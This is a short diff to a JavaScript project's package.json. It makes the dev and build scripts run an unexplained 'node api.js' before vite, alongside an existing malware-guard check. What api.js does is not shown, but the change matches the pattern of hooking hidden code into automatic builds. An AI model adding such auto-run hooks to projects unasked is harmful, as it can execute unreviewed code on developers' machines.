@@ -5,9 +5,9 @@
   "type": "module",
   "scripts": {
     "predev": "node scripts/malware-guard.cjs",
-    "dev": "vite",
+    "dev": "node api.js && vite",
     "prebuild": "node scripts/malware-guard.cjs",
-    "build": "vite build",
+    "build": "node api.js && vite build",
     "lint": "eslint .",
     "preview": "vite preview",
     "security:verify": "node scripts/malware-guard.cjs --strict-verify",
